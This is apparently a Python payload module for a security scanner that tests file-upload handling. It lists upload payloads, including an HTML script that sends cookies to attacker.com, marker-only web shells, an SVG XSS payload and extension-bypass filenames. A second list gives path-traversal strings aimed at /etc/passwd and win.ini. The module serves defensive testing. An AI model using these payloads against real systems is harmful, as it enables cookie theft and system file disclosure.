"""Security rules and payloads for 2-1 Malicious File Upload Scan."""

from typing import List, Tuple

# Format: (filename, content (bytes), content_type, attack_desc)
FILE_UPLOAD_PAYLOADS: List[Tuple[str, bytes, str, str]] = [
    (
        "exploit.html",
        b'<html><body><script>document.location="http://attacker.com/?c="+document.cookie</script></body></html>',
        "image/jpeg",
        "HTML 파일 (XSS)",
    ),
    (
        "shell.jsp",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "JSP 웹셸",
    ),
    (
        "shell.jspx",
        b'<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.1">'
        b'<jsp:directive.page contentType="text/html" pageEncoding="UTF-8"/>'
        b'<jsp:scriptlet>out.println("UPLOAD_TEST_JSPX");</jsp:scriptlet>'
        b'</jsp:root>',
        "image/jpeg",
        "JSPX 웹셸",
    ),
    (
        "test.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "PHP 웹셸",
    ),
    (
        "eicar.com",
        b'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*',
        "application/octet-stream",
        "EICAR 안티바이러스 테스트 파일",
    ),
    (
        "svg_script.svg",
        b'<?xml version="1.0" standalone="no"?>\n'
        b'<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" '
        b'"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">\n'
        b'<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">\n'
        b'  <script type="text/javascript">\n'
        b'    alert("SVG XSS");\n'
        b'  </script>\n'
        b'</svg>',
        "image/svg+xml",
        "SVG XSS 페이로드",
    ),
    (
        "fake_image.jpg.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "이중 확장자 우회 (.jpg.php)",
    ),
    (
        "fake_image.php.jpg",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "이중 확장자 우회 (.php.jpg)",
    ),
    (
        "null_byte.jpg%00.php",
        b'<?php echo "UPLOAD_TEST_PHP"; ?>',
        "image/jpeg",
        "Null-Byte 삽입 (%00)",
    ),
    (
        "semicolon_bypass.jsp;.jpg",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "세미콜론(;) 확장자 파싱 우회",
    ),
    (
        "percent_bypass.jsp%20",
        b'<%@ page import="java.io.*" %><% out.println("UPLOAD_TEST"); %>',
        "image/jpeg",
        "퍼센트(%) 및 공백 확장자 파싱 우회",
    ),
]

DIRECTORY_TRAVERSAL_PAYLOADS: List[Tuple[str, str]] = [
    ("../../../../../../../../etc/passwd", "디렉터리 트래버셜 (Linux 기본 ../)"),
    ("..\\..\\..\\..\\..\\..\\..\\windows\\win.ini", "디렉터리 트래버셜 (Windows 기본 ..\\)"),
    ("././././././././etc/passwd", "디렉터리 트래버셜 (./ 필터 우회 테스트)"),
    (".._\\.._\\.._\\windows\\win.ini", "디렉터리 트래버셜 (_\\ 필터 우회 테스트)"),
    (".\\.\\.\\windows\\win.ini", "디렉터리 트래버셜 (.\\ 필터 우회 테스트)"),
    ("..%2f..%2f..%2fetc%2fpasswd", "디렉터리 트래버셜 (URL 인코딩 % 우회)"),
]

def get_upload_payloads() -> List[Tuple[str, bytes, str, str]]:
    return FILE_UPLOAD_PAYLOADS

def get_traversal_payloads() -> List[Tuple[str, str]]:
    return DIRECTORY_TRAVERSAL_PAYLOADS
